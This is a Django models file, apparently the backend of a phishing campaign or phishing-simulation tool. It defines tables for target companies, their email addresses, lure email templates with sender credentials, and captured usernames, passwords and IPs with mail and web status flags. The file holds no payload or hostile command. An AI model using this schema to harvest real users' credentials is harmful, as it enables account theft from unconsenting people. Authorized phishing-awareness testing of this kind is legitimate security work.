from django.db import models

# Create your models here.
class Empresas(models.Model):
    id = models.AutoField(primary_key=True)
    nombre = models.CharField(max_length=50, null=True, blank=True)

    def __str__(self):
        return self.nombre

class Correos(models.Model):
    id = models.AutoField(primary_key=True)
    correo = models.CharField(max_length=100)
    empresa = models.ForeignKey(Empresas, on_delete=models.CASCADE)

    def __str__(self):
        return self.correo
    
class Plantillas(models.Model):
    id = models.AutoField(primary_key=True)
    servicio = models.CharField(max_length=50)
    email = models.CharField(max_length=100, null=True, blank=True)
    password = models.CharField(max_length=100, null=True, blank=True)
    asunto = models.CharField(max_length=100, null=True, blank=True)
    mensaje = models.TextField(null=True, blank=True)


    def __str__(self):
        return self.servicio
    
    
class Credenciales(models.Model):
    id = models.AutoField(primary_key=True)
    usuario = models.CharField(max_length=20, null=True, blank=True)
    contraseña = models.CharField(max_length=25, null=True, blank=True)
    ip = models.CharField(max_length=20, null=True, blank=True)
    fecha_envio = models.DateTimeField(auto_now_add=True)
    correo = models.ForeignKey(Correos, on_delete=models.CASCADE)
    mail_status = models.BooleanField(default=False)
    web_status = models.BooleanField(default=False)
    fecha_mail = models.DateTimeField(auto_now_add=True, null=True, blank=True)
    fecha_web = models.DateTimeField(auto_now_add=True, null=True, blank=True)
    intento = models.ForeignKey(Plantillas, on_delete=models.CASCADE)

    def __str__(self):
        return str(self.id)
    

    
